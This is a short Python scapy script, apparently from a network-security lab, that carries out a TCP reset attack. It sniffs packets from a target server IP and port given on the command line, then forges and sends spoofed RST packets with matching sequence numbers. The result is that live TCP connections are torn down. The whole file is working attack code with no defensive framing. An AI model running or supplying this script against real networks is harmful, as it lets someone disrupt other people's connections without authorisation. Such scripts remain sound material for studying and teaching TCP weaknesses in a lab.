#!/usr/bin/python3
# -------------------------------
import sys
from scapy.all import *

if len(sys.argv) != 3:
  print("Usage: sys.argv[0] <dstn IP> <Dstn Port>")
  exit();

def spoof_pkt(pkt):
  old_tcp = pkt[TCP]
  old_ip = pkt[IP]
  ip = IP(src=old_ip.dst, dst=old_ip.src)
  tcp = TCP(sport=old_tcp.dport, dport=old_tcp.sport, 
            flags="R", seq=old_tcp.ack)
  pkt = ip/tcp
  ls(pkt)
  send(pkt, verbose=0)

# program has 2 params
server_ip = sys.argv[1]
server_port = sys.argv[2]

template = 'tcp and (src {A} and port {B})' 
cap_filter = template.format(A=server_ip, B=server_port)
print(cap_filter)
pkt = sniff(iface='eth0', filter=cap_filter, prn=spoof_pkt, count=3)

  
